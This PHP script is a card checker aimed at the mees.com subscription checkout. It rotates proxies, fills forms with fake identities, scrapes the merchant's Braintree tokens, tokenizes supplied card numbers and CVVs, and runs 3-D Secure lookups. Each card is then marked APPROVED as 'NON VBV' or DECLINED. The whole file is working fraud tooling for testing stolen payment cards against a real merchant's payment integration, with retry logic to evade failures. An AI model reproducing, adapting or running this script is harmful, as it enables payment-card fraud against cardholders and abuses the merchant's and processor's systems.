<?php

$retry = 0;

$isRetry = False;

start:

if ($isRetry) {
	$retry++;

	$this->curlx->DeleteCookie();
}

if ($retry > 2) {
	if (empty($empty)) $empty = 'Maximum Retrys Reached';

	$status = ['emoji' => '❌', 'status' => 'DECLINED', 'msg' => "RETRY - $empty!"];

	goto end;
}

$isRetry = True;

$server = $this->proxy();

$fake = $this->tools->GetUser();

$cookie = uniqid();

$r1 = $this->curlx->Get('https://www.mees.com/subscribe/billing-info?type=basic', null, $cookie, $server['proxy']);

if (!$r1->success) goto start;

$_token = trim(strip_tags($this->getstr($r1->body, '_token" value="', '"')));

if (empty($_token)) {
	$empty = 'First Request Token is Empty';

	goto start;
}

$data = '_token='.$_token.'&type=basic&title=Mr&first_name='.$fake->first.'&last_name='.$fake->last.'&email='.urlencode($fake->email).'&telephone=2564567654&extension=&business_title=&department=&company=&vat=&address_line_1=12+main+street&address_line_2=&address_line_3=&postcode=10509&city=Brewster&state=&country=US&delivery=email';

$r2 = $this->curlx->Post('https://www.mees.com/subscribe/billing-info', $data, null, $cookie, $server['proxy']);

if (!$r2->success) goto start;

$authorization = trim(strip_tags($this->getstr($r2->body, "authorization = '", "'")));

if (empty($authorization)) {
	$empty = 'Second Request Token is Empty';

	goto start;
}

$b3_data = json_decode(base64_decode($authorization));

if (!isset($b3_data->authorizationFingerprint, $b3_data->merchantId)) {
	$empty = 'Second Request Tokens is Empty';

	goto start;
}

$authorizationFingerprint = $b3_data->authorizationFingerprint;

$merchantId = $b3_data->merchantId;

$sessionId = substr($fake->guid, 0, -6);

$data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"'.$sessionId.'"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mm.'","expirationYear":"'.$yyyy.'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}';

$headers = [
	"authorization: Bearer $authorizationFingerprint",
	'braintree-version: 2018-05-10',
	'content-type: application/json'
];

$r3 = $this->curlx->Post('https://payments.braintree-api.com/graphql', $data, $headers, $cookie, $server['proxy']);

if (!$r3->success) goto start;

$token = $this->getstr($r3->body, 'token":"', '"');

if (empty($token)) {
	$empty = 'Fifth Request Token is Empty';

	goto start;
}

$data = '{"amount":"3250","additionalInfo":{},"bin":"'.substr($cc, 0, 6).'","dfReferenceId":"0_849281b2-33e5-43bc-bfe5-b7c3456ea89c","clientMetadata":{"requestedThreeDSecureVersion":"2","sdkVersion":"web/3.85.2","cardinalDeviceDataCollectionTimeElapsed":650,"issuerDeviceDataCollectionTimeElapsed":8928,"issuerDeviceDataCollectionResult":true},"authorizationFingerprint":"'.$authorizationFingerprint.'","braintreeLibraryVersion":"braintree/web/3.85.2","_meta":{"merchantAppId":"www.mees.com","platform":"web","sdkVersion":"3.85.2","source":"client","integration":"custom","integrationType":"custom","sessionId":"'.$sessionId.'"}}';

$headers = [
	'content-type: application/json',
	'origin: https://www.mees.com',
	'referer: https://www.mees.com/'
];

$r4 = $this->curlx->Post('https://api.braintreegateway.com/merchants/'.$merchantId.'/client_api/v1/payment_methods/'.$token.'/three_d_secure/lookup', $data, $headers, $cookie, $server['proxy']);

if (!$r4->success) goto start;

$vbv_status = trim(strip_tags($this->getstr($r4->body, '"status":"', '"')));

$vbv_enrolled = trim(strip_tags($this->getstr($r4->body, '"enrolled":"', '"')));

$result = strtoupper(str_replace('_', ' ', "$vbv_status -> {$vbv_enrolled}"));

if ($vbv_status == "authenticate_successful" || $vbv_status == "authenticate_attempt_successful" || $vbv_status == "lookup_not_enrolled" || strtolower($vbv_enrolled) == 'n') {
	$status = 'APPROVED';

	$emoji = '✅';
} else {
	$status = 'DECLINED';

	$emoji = '❌';
}

$status = ['status' => $status, 'emoji' => $emoji, 'msg' => ''.($emoji == '✅' ? 'NON VBV' : 'VBV')." CARD - $result"];

end: